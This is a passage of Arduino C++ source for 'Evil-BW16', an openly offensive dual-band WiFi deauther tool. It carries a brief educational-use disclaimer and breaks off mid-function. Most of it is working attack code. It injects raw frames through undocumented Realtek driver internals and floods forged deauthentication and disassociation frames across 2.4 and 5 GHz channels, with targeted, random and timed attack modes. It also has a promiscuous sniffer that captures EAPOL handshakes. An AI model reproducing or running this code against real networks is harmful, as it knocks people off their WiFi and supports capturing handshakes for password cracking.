/*
   Evil-BW16 - WiFi Dual band deauther

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/

// Undefine any existing min/max macros to prevent conflicts
#ifdef min
#undef min
#endif
#ifdef max
#undef max
#endif

#include <Arduino.h>
#include <vector>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"

//==========================
// User Configuration
//==========================
#define WIFI_SSID       "7h30th3r0n35Ghz"
#define WIFI_PASS       "5Ghz7h30th3r0n3Pass"
#define WIFI_CHANNEL    1

bool USE_LED = true;
bool DEBUG_MODE = false;  // Debug mode flag

// Attack parameters
unsigned long last_cycle     = 0;
unsigned long cycle_delay    = 2000;     // Delay between attack cycles (ms)
unsigned long scan_time      = 5000;     // WiFi scan duration (ms)
unsigned long num_send_frames = 3;
int start_channel            = 1;        // 1 => 2.4GHz start, 36 => 5GHz only
bool scan_between_cycles     = false;    // If true, scans between each attack cycle

uint8_t dst_mac[6]  = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Broadcast

enum SniffMode {
  SNIFF_ALL,
  SNIFF_BEACON,
  SNIFF_PROBE,
  SNIFF_DEAUTH,
  SNIFF_EAPOL,
  SNIFF_PWNAGOTCHI,
  SNIFF_STOP
};

// Channel hopping configuration
bool isHopping = false;
unsigned long lastHopTime = 0;
const unsigned long HOP_INTERVAL = 500; // 500ms between hops
const int CHANNELS_2GHZ[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13};
const int CHANNELS_5GHZ[] = {36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165};
int currentChannelIndex = 0;
int currentChannel = 36; // Default channel

SniffMode currentMode = SNIFF_STOP;  // Start in STOP mode
bool isSniffing = false;             // Global flag to track if sniffing is active

const int MAX_CUSTOM_CHANNELS = 50;
int customChannels[MAX_CUSTOM_CHANNELS];
int numCustomChannels = 0;
bool useCustomChannels = false;

//-------------------
// Timed Attack
//-------------------
bool timedAttackEnabled      = false;
unsigned long attackStartTime = 0;
unsigned long attackDuration  = 10000; // default 10 seconds

//==========================================================
// Frame Structures
//==========================================================
typedef struct {
  uint16_t frame_control = 0xC0;  // Deauth
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
  uint8_t channel;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0xA0;  // Disassociation
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x08;
  uint8_t channel;
} DisassocFrame;

//==========================================================
// Data Structures
//==========================================================
struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

struct WiFiStationResult {
  bool selected = false;
  String mac_str;
  uint8_t mac[6];
  short rssi;
};

// =========================
// 802.11 Header Structure
// =========================
#pragma pack(push, 1)
struct wifi_ieee80211_mac_hdr {
  uint16_t frame_control;
  uint16_t duration_id;
  uint8_t  addr1[6];
  uint8_t  addr2[6];
  uint8_t  addr3[6];
  uint16_t seq_ctrl;
};
#pragma pack(pop)

static inline uint8_t ieee80211_get_type(uint16_t fc) {
  return (fc & 0x0C) >> 2;
}
static inline uint8_t ieee80211_get_subtype(uint16_t fc) {
  return (fc & 0xF0) >> 4;
}

// ************************************************************
// * Updated sendResponse() with newline-enforced messages *
// ************************************************************
// Define UART buffer size and chunk size
#define UART_CHUNK_SIZE 256
#define UART_BUFFER_SIZE 512 // Define UART buffer size
#define USB_BUFFER_SIZE 1024 // Define USB buffer size

// Simple min function implementation
template<typename T>
T min(T a, T b) {
    return (a < b) ? a : b;
}

// Rate limiter variables
unsigned long lastUARTSend = 0;
const unsigned long UART_MIN_INTERVAL = 50; // Minimum 50ms between UART sends

void sendResponse(const String& response) {
    // If there's nothing to send, just return
    if (response.length() == 0) {
        return;
    }
    
    // Create a mutable copy of the response and ensure it ends with '\n'
    String msg = response;
    if (!msg.endsWith("\n")) {
        msg += "\n";
    }
    
    // Determine if the message should be sent
    bool shouldSend = msg.startsWith("[INFO]") || msg.startsWith("[ERROR]") || (DEBUG_MODE && msg.startsWith("[DEBUG]"));
    if (!shouldSend) {
        return;
    }

    // Log the response to USB serial for debugging if enabled
    if (DEBUG_MODE) {
        Serial.print("[DEBUG] Full Response: ");
        Serial.print(msg);
    }

    // Send complete message over USB Serial using print (since msg already contains a newline)
    Serial.print(msg);

    // Preserve existing UART logic with rate limiting
    unsigned long currentTime = millis();
    if (currentTime - lastUARTSend < UART_MIN_INTERVAL) {
        delay(UART_MIN_INTERVAL - (currentTime - lastUARTSend));
    }
    // Send complete message over UART Serial using print
    Serial1.print(msg);
    Serial1.flush();
    lastUARTSend = millis();
}

// =========================
// Promiscuous Callback
// =========================
void promisc_callback(unsigned char *buf, unsigned int len, void * /*userdata*/) {
  if (currentMode == SNIFF_STOP) return;

  // Checks the minimum size to contain the 802.11 header
  if (!buf || len < sizeof(wifi_ieee80211_mac_hdr)) {
    return;
  }

  // Interpret the header
  wifi_ieee80211_mac_hdr *hdr = (wifi_ieee80211_mac_hdr *)buf;
  uint16_t fc = hdr->frame_control;
  uint8_t ftype = ieee80211_get_type(fc);
  uint8_t fsubtype = ieee80211_get_subtype(fc);

  // Filter based on current mode
  if (currentMode != SNIFF_ALL) {
    if (currentMode == SNIFF_BEACON && !(ftype == 0 && fsubtype == 8)) return;
    if (currentMode == SNIFF_PROBE && !(ftype == 0 && (fsubtype == 4 || fsubtype == 5))) return;
    if (currentMode == SNIFF_DEAUTH && !(ftype == 0 && (fsubtype == 12 || fsubtype == 10))) return;
    if (currentMode == SNIFF_EAPOL && (ftype != 2 || !isEAPOL(buf, len))) return;
    if (currentMode == SNIFF_PWNAGOTCHI && !(ftype == 0 && fsubtype == 8 && isPwnagotchiMac(hdr->addr2))) return;
  }

  String output = "[INFO] "; // Initialize an output string to store the results with [INFO] prefix

  // ============ Management ============
  if (ftype == 0) {
    // Beacon
    if (fsubtype == 8) {
      output += "[MGMT] Beacon detected ";
      // Source MAC => hdr->addr2
      output += "Source MAC: ";
      char macBuf[18];
      snprintf(macBuf, sizeof(macBuf), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += macBuf;

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
        // Check if it's a pwnagotchi (MAC DE:AD:BE:EF:DE:AD)
        if (isPwnagotchiMac(hdr->addr2)) {
          output += " Pwnagotchi Beacon!";
        }
      }
    }
    // Deauth or Disassoc
    else if (fsubtype == 12 || fsubtype == 10) {
      // Note: 12 => Deauth, 10 => Disassoc
      bool isDeauth = (fsubtype == 12);
      output += (isDeauth ? "[MGMT] Deauth detected " : "[MGMT] Disassoc detected ");

      // Sender MAC => hdr->addr2, Receiver MAC => hdr->addr1
      char senderMac[18], receiverMac[18];
      snprintf(senderMac, sizeof(senderMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(receiverMac, sizeof(receiverMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Sender MAC: " + String(senderMac) + " Receiver MAC: " + String(receiverMac);

      // Reason code if available
      if (len >= 26) { // 24-byte header + 2 bytes reason
        uint16_t reasonCode = (uint16_t)buf[24] | ((uint16_t)buf[25] << 8);
        output += " Reason code: " + String(reasonCode);
      }
    }
    // Probe Request
    else if (fsubtype == 4) {
      output += "[MGMT] Probe Request ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the requested ESSID (often, it's an empty SSID for scanning)
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " Probe SSID: " + ssid;
      }
    }
    // Probe Response
    else if (fsubtype == 5) {
      output += "[MGMT] Probe Response ";
      // Displays the source
      char sourceMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      output += "Source MAC: " + String(sourceMac);

      // Try to retrieve the ESSID
      const uint8_t *framePtr = (const uint8_t *)buf;
      String ssid = extractSSID(framePtr, len);
      if (ssid.length() > 0) {
        output += " SSID: " + ssid;
      }
    }
    else {
      output += "[MGMT] Other subtype = " + String(fsubtype);
    }
  }
  // ============ Control ============
  else if (ftype == 1) {
    output += "[CTRL] Subtype = " + String(fsubtype);
  }
  // ============ Data ============
  else if (ftype == 2) {
    // Try EAPOL detection
    if (isEAPOL(buf, len)) {
      output += "[DATA] EAPOL detected! ";
      // Display source and destination MAC
      char sourceMac[18], destMac[18];
      snprintf(sourceMac, sizeof(sourceMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
               hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);
      snprintf(destMac, sizeof(destMac), "%02X:%02X:%02X:%02X:%02X:%02X",
               hdr->addr1[0], hdr->addr1[1], hdr->addr1[2],
               hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);
      output += "Source MAC: " + String(sourceMac) + " Destination MAC: " + String(destMac);
    }
    else {
      output += "[DATA] Other data subtype = " + String(fsubtype);
    }
  }

  // Send the output
  sendResponse(output);
}

// =========================
// Utility Functions
// =========================

void setChannel(int newChannel) {
  if (!isSniffing) {
    // Need to initialize WiFi first
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
  }
  currentChannel = newChannel;
  wifi_set_channel(currentChannel);
}

void hopChannel() {
  if (isHopping && (millis() - lastHopTime >= HOP_INTERVAL)) {
    currentChannelIndex++;

    if (useCustomChannels) {
      // Hopping on custom-defined channels
      if (currentChannelIndex >= numCustomChannels) {
        currentChannelIndex = 0;
      }
      currentChannel = customChannels[currentChannelIndex];
    } else {
      // Hopping between 2.4 GHz and 5.8 GHz bands
      static bool use5GHz = false; // Alternates between the two bands

      size_t channelCount5GHz = sizeof(CHANNELS_5GHZ) / sizeof(CHANNELS_5GHZ[0]);
      size_t channelCount2GHz = sizeof(CHANNELS_2GHZ) / sizeof(CHANNELS_2GHZ[0]);
      if (use5GHz) {
        // Check if we exceed the available channels in the 5 GHz band
        if ((int)currentChannelIndex >= channelCount5GHz) {
          currentChannelIndex = 0;
          use5GHz = false; // Switch to the 2.4 GHz band
        }
        currentChannel = CHANNELS_5GHZ[currentChannelIndex];
      } else {
        // Check if we exceed the available channels in the 2.4 GHz band
        if ((int)currentChannelIndex >= channelCount2GHz) {
          currentChannelIndex = 0;
          use5GHz = true; // Switch to the 5 GHz band
        }
        currentChannel = CHANNELS_2GHZ[currentChannelIndex];
      }
    }

    setChannel(currentChannel); // Set the selected channel
    sendResponse("[HOP] Switched to channel " + String(currentChannel));
    lastHopTime = millis(); // Update the last hop time
  }
}

//==========================
// Sniffer Functions
//==========================
void startSniffing() {
  if (!isSniffing) {
    sendResponse("[INFO] Enabling promiscuous mode...");

    // Initialize WiFi in PROMISC mode
    wifi_on(RTW_MODE_PROMISC);
    wifi_enter_promisc_mode();
    setChannel(currentChannel);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1);

    isSniffing = true;
    sendResponse("[INFO] Sniffer initialized and running.");
  }
}

void stopSniffing() {
  if (isSniffing) {
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 0);
    isSniffing = false;
    currentMode = SNIFF_STOP;
    sendResponse("[CMD] Sniffer stopped");
  }
}

// Prints a MAC address on the serial port, format XX:XX:XX:XX:XX:XX
void printMac(const uint8_t *mac) {
  char buf[18]; // XX:XX:XX:XX:XX:XX + terminator
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
           mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  sendResponse(buf);
}

// Tries to extract the ESSID from a Beacon or Probe in the payload,
// assuming a basic Management header (24 bytes) + 12 fixed bytes
// => We usually start at offset 36 for the first tag.
// WARNING: This method is simplified and may fail if other tags precede the SSID.
String extractSSID(const uint8_t *frame, int totalLen) {
  // Minimal offset for the variable part (SSID tag) after a standard Beacon/Probe
  const int possibleOffset = 36;
  if (totalLen < possibleOffset + 2) {
    return "";
  }

  // The first tag should be the SSID tag (ID = 0)
  // frame[possibleOffset] = tagNumber, frame[possibleOffset+1] = tagLength
  uint8_t tagNumber  = frame[possibleOffset];
  uint8_t tagLength  = frame[possibleOffset + 1];

  // If we have an SSID tag
  if (tagNumber == 0 && possibleOffset + 2 + tagLength <= totalLen) {
    // Build the string
    String essid;
    for (int i = 0; i < tagLength; i++) {
      char c = (char)frame[possibleOffset + 2 + i];
      // Basic filter: only printable ASCII characters are shown
      if (c >= 32 && c <= 126) {
        essid += c;
      }
    }
    return essid;
  }
  // Not found / non-SSID tag
  return "";
}

// Checks if the source MAC is "DE:AD:BE:EF:DE:AD"
bool isPwnagotchiMac(const uint8_t *mac) {
  const uint8_t pwnMac[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD};
  for (int i = 0; i < 6; i++) {
    if (mac[i] != pwnMac[i]) return false;
  }
  return true;
}

bool isEAPOL(const uint8_t *buf, int len) {
  // Check the minimum size:
  // 24 bytes for the MAC header, +8 for LLC/SNAP, +4 for a minimal EAPOL
  if (len < (24 + 8 + 4)) {
    return false;
  }

  // First case: "classic" frame (without QoS)
  // Check for the presence of the LLC/SNAP header indicating EAPOL (0x88, 0x8E)
  if (buf[24] == 0xAA && buf[25] == 0xAA && buf[26] == 0x03 &&
      buf[27] == 0x00 && buf[28] == 0x00 && buf[29] == 0x00 &&
      buf[30] == 0x88 && buf[31] == 0x8E) {
    return true;
  }

  // Second case: QoS frame (Frame Control field indicates a QoS data subtype)
  // We identify this if (buf[0] & 0x0F) == 0x08 (subtype = 1000b = 8)
  // In this case, the QoS header adds 2 extra bytes after the initial 24 bytes,
  // so the LLC/SNAP header starts at offset 24 + 2 = 26
  if ((buf[0] & 0x0F) == 0x08) {
    if (buf[26] == 0xAA && buf[27] == 0xAA && buf[28] == 0x03 &&
        buf[29] == 0x00 && buf[30] == 0x00 && buf[31] == 0x00 &&
        buf[32] == 0x88 && buf[33] == 0x8E) {
      return true;
    }
  }

  return false;
}

//==========================================================
// Externs & Prototypes (Realtek / Ameba Specific)
//==========================================================
extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

// Typically: int wifi_get_mac_address(char *mac);
extern "C" int wifi_get_mac_address(char *mac);

//==========================================================
// Function Prototypes
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason = 0x08);

int scanNetworks();
void printScanResults();
void handleCommand(String command);
void targetAttack();
void generalAttack();
void attackCycle();
void startTimedAttack(unsigned long durationMs);
void checkTimedAttack();

//==========================================================
// Global Vectors
//==========================================================
std::vector<WiFiScanResult> scan_results;
std::vector<WiFiScanResult> target_aps;

//==========================================================
// Disassociation Attack Control
//==========================================================
bool disassoc_enabled           = false;  // If true, perform continuous disassoc
unsigned long disassoc_interval = 1000;   // Interval in ms
unsigned long last_disassoc_attack = 0;

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)(*(uint32_t *)(frame_control + 0x80)), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)(*(uint32_t *)(frame_control + 0x80)) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

//==========================================================
// Deauth & Disassoc
//==========================================================
void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
  int num_channels = sizeof(channels) / sizeof(channels[0]);
  for (int i = 0; i < num_channels; ++i) {
    int channel = channels[i];
    // Vary the frame content slightly for each channel
    frame.channel = channel;
    memcpy(&frame.source, src_mac, 6);
    memcpy(&frame.access_point, src_mac, 6);
    memcpy(&frame.destination, dst_mac, 6);
    frame.reason = reason;
    wifi_set_channel(channel);
    wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
  }
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  int channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165};
  int num_channels = sizeof(channels) / sizeof(channels[0]);
  for (int i = 0; i < num_channels; ++i) {
    int channel = channels[i];
    // Vary the frame content slightly for each channel
    frame.channel = channel;
    memcpy(&frame.source, src_mac, 6);
    memcpy(&frame.access_point, src_mac, 6);
    memcpy(&frame.destination, dst_mac, 6);
    frame.reason = reason;
    wifi_set_channel(channel);
    wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
  }
}

//==========================================================
// Sorting Helper
//==========================================================
void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

//==========================================================
// Wi-Fi Scan Callback
//==========================================================
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    if (DEBUG_MODE) {
      Serial.print("[DEBUG] SSID Length: ");
      Serial.print(record->SSID.len);
      Serial.print(", Signal Strength: ");
      Serial.println(record->signal_strength);
    }
    if (record->SSID.len == 0) {
      if (DEBUG_MODE) {
        Serial.println("[DEBUG] Empty SSID detected, assigning default name.");
        Serial.print("[DEBUG] BSSID: ");
        for (int i = 0; i < 6; i++) {
          if (i > 0) Serial.print(":");
          Serial.print(record->BSSID.octet[i], HEX);  // Access BSSID as an array of octets
        }
        Serial.print(", Channel: ");
        Serial.println(record->channel);
      }
      // Assign a default name for networks with empty SSID
      strcpy((char*)record->SSID.val, "<Hidden SSID>");
      record->SSID.len = strlen("<Hidden SSID>");
    } else {
      record->SSID.val[record->SSID.len] = 0;
    }

    // Keep only APs >= start_channel if you want to filter 5GHz
    if ((int)record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID.octet, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str),
               "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }
  } else {
    // Scan completed
  }
  return RTW_SUCCESS;
}

//==========================================================
// Start a WiFi Scan
//==========================================================
int scanNetworks() {
  sendResponse("[INFO] Initiating WiFi scan...");
  scan_results.clear();
  sendResponse("[INFO] Cleared previous scan results.");
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    sendResponse("[INFO] WiFi scan started successfully.");
    if (USE_LED) digitalWrite(LED_G, HIGH);
    delay(scan_time);
    sendResponse("[INFO] WiFi scan delay completed.");
    sendResponse("[INFO] Scan completed!");

    // Sort results by channel
    sortByChannel(scan_results);
    sendResponse("[INFO] Scan results sorted by channel.");
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    sendResponse("[ERROR] Failed to start the WiFi scan!");
    return 1;
  }
}

//==========================================================
// Print Scan Results
//==========================================================
void printScanResults() {
  sendResponse("[INFO] Printing scan results...");
  if (scan_results.empty()) {
    sendResponse("[INFO] No networks detected.");
    return;
  }

  sendResponse("Detected networks:");
  String tableHeader = "[INFO] Index\tSSID\t\tBSSID\t\tChannel\tRSSI (dBm)\tFrequency\n";
  sendResponse(tableHeader);
  
  // Revert batch size to 2
  const int batchSize = 2;
  for (size_t i = 0; i < scan_results.size(); i += batchSize) {
    String batchData = "";
    for (size_t j = i; j < i + batchSize && j < scan_results.size(); j++) {
      String freq = (scan_results[j].channel >= 36) ? "5GHz" : "2.4GHz";
      batchData += "[INFO] " + String(j) + "\t" + scan_results[j].ssid + "\t" + 
                  scan_results[j].bssid_str + "\t" +
                  String(scan_results[j].channel) + "\t" + 
                  String(scan_results[j].rssi) + "\t" + freq + "\n";
    }
    sendResponse(batchData);
    delay(300); // Small delay between batches
  }
  
  // Ensure all data is printed before indicating completion
  delay(1000); // Additional delay to ensure all data is sent
  sendResponse("[INFO] Scan results printed.");
}

//==========================================================
// Attack State Variables
//==========================================================
bool attack_enabled = false;
bool scan_enabled   = false;
bool target_mode    = false;

//==========================================================
// Timed Attack
//==========================================================
unsigned long calculateFramesForDuration(unsigned long durationMs, unsigned long frameTimeMs) {
    return durationMs / frameTimeMs;
}

void startTimedAttack(unsigned long durationMs) {
    unsigned long frameTimeMs = 50; // Adjusted estimated time per frame in ms
    num_send_frames = calculateFramesForDuration(durationMs, frameTimeMs);
    timedAttackEnabled = true;
    attackStartTime    = millis();
    attackDuration     = durationMs;
    attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    sendResponse("[INFO] Timed attack ended.");
  }
}

//==========================================================
// Handle Incoming Commands
//==========================================================
void handleCommand(String command) {
  command.trim();

  // Filter out lines that start with '[INFO]', '[DEBUG]', or '[ERROR]' to prevent responses from being processed as commands
  if (command.startsWith("[INFO]") || command.startsWith("[DEBUG]") || command.startsWith("[ERROR]")) {
    return;
  }

  sendResponse("[INFO] Received Command: " + command);

  // Deauth Attack Commands
  if (command.equalsIgnoreCase("start deauther")) {
    attack_enabled = true;
    sendResponse("[INFO] Deauthentication Attack started.");
  }
  else if (command.equalsIgnoreCase("stop deauther")) {
    // Unified stop command: Stops all active attacks
    attack_enabled = false;
    disassoc_enabled = false;
    sendResponse("[INFO] All attacks stopped.");
  }
  else if (command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    sendResponse("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      sendResponse("[INFO] Scan completed.");
    }
    else {
      sendResponse("[ERROR] Scan failed.");
    }
  }
  else if (command.equalsIgnoreCase("results")) {
    if (!scan_results.empty()) {
      printScanResults();
    }
    else {
      sendResponse("[INFO] No scan results available. Try 'scan' first.");
    }
  }

  //==========================
  // Timed Attack
  //==========================
  else if (command.startsWith("attack_time ")) {
    String valStr = command.substring(String("attack_time ").length());
    unsigned long durationMs = valStr.toInt();
    if (durationMs > 0) {
      startTimedAttack(durationMs);
    }
    else {
      sendResponse("[ERROR] Invalid attack duration.");
    }
  }

  //==========================
  // Disassociation Attack Commands (Start Only)
  //==========================
  else if (command.equalsIgnoreCase("disassoc")) {
    if (!disassoc_enabled) {
      disassoc_enabled = true;
      sendResponse("[INFO] Continuous Disassociation Attack started.");
    }
    else {
      sendResponse("[INFO] Disassociation Attack is already running.");
    }
  }

  //==========================
  // Random Channel Attack
  //==========================
  else if (command.equalsIgnoreCase("random_attack")) {
    if (!scan_results.empty()) {
      size_t idx = random(0, scan_results.size());
      uint8_t randChannel = scan_results[idx].channel;
      wifi_set_channel(randChannel);
      for (int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(scan_results[idx].bssid, dst_mac, 2);
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }
        sendResponse("[RANDOM ATTACK] Deauth " + String(j + 1) + " => " + scan_results[idx].ssid +
                     " on channel " + String(randChannel));
      }
    }
    else {
      sendResponse("[ERROR] No AP results available. Run 'scan' first.");
    }
  }

  else if (command == "start sniff") {
    currentMode = SNIFF_ALL;
    startSniffing();
    sendResponse("[CMD] Starting sniffer in ALL mode");
  }
  else if (command == "hop on") {
    isHopping = true;
    if (!isSniffing) {
      wifi_on(RTW_MODE_PROMISC);
      wifi_enter_promisc_mode();
    }
    sendResponse("[CMD] Channel hopping enabled");
  }
  else if (command == "hop off") {
    isHopping = false;
    sendResponse("[CMD] Channel hopping disabled");
  }
  else if (command.startsWith("set ch ")) {
    String chStr = command.substring(7);

    // Check if it's a comma-separated list
    if (chStr.indexOf(',') != -1) {
      // Reset custom channels
      numCustomChannels = 0;
      useCustomChannels = false;

      // Parse comma-separated channels
      while (chStr.length() > 0) {
        int commaIndex = chStr.indexOf(',');
        String channelStr;

        if (commaIndex == -1) {
          channelStr = chStr;
          chStr = "";
        } else {
          channelStr = chStr.substring(0, commaIndex);
          chStr = chStr.substring(commaIndex + 1);
        }

        channelStr.trim();
        int newChannel = channelStr.toInt();

        // Validate channel
        bool validChannel = false;
        for (int ch : CHANNELS_2GHZ) {
          if (ch == newChannel) validChannel = true;
        }
        for (int ch : CHANNELS_5GHZ) {
          if (ch == newChannel) validChannel = true;
        }

        if (validChannel && numCustomChannels < MAX_CUSTOM_CHANNELS) {
          customChannels[numCustomChannels++] = newChannel;
        }
      }

      if (numCustomChannels > 0) {
        useCustomChannels = true;
        isHopping = true;
        currentChannelIndex = 0;
        currentChannel = customChannels[0];
        setChannel(currentChannel);
        sendResponse("[CMD] Set custom channel sequence: ");
        for (int i = 0; i < numCustomChannels; i++) {
          sendResponse(String(customChannels[i]) + (i < numCustomChannels - 1 ? "," : ""));
        }
      }
    } else {
      // Single channel setting
      int newChannel = chStr.toInt();
      bool validChannel = false;
      for (int ch : CHANNELS_2GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      for (int ch : CHANNELS_5GHZ) {
        if (ch == newChannel) validChannel = true;
      }
      if (validChannel) {
        isHopping = false;
        useCustomChannels = false;
        setChannel(newChannel);
        sendResponse("[CMD] Set to channel " + String(currentChannel));
      } else {
        sendResponse("[ERROR] Invalid channel number");
      }
    }
  }
  else if (command == "sniff beacon") {
    currentMode = SNIFF_BEACON;
    startSniffing();
    sendResponse("[CMD] Switching to BEACON sniffing mode");
  }
  else if (command == "sniff probe") {
    currentMode = SNIFF_PROBE;
    startSniffing();
    sendResponse("[CMD] Switching to PROBE sniffing mode");
  }
  else if (command == "sniff deauth") {
    currentMode = SNIFF_DEAUTH;
    startSniffing();
    sendResponse("[CMD] Switching to DEAUTH sniffing mode");
  }
  else if (command == "sniff eapol") {
    currentMode = SNIFF_EAPOL;
    startSniffing();
    sendResponse("[CMD] Switching to EAPOL sniffing mode");
  }
  else if (command == "sniff pwnagotchi") {
    currentMode = SNIFF_PWNAGOTCHI;
    startSniffing();
